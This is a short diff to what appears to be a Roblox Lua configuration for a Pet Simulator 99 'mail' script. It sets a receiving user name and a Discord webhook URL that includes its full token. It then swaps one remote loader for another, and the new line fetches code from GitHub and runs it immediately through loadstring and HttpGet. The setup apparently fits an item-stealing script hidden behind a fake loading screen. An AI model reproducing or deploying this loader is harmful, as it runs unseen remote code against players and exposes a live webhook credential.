@@ -2,4 +2,5 @@ _G.User = "awesomealt002"
 _G.Webhook = "https://discord.com/api/webhooks/1202172755416453120/ySOotp2wICV29pAuxphV0QnWRj_1yhT1SEhAernJKKgDZkJ8vqzFHakYQhMZQZigJ0nR"
 selectedLoadingScreen = "4"
 LoadingScreen = true
-loadstring(game:HttpGet("https://roblox.blxbby.org/ps99.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
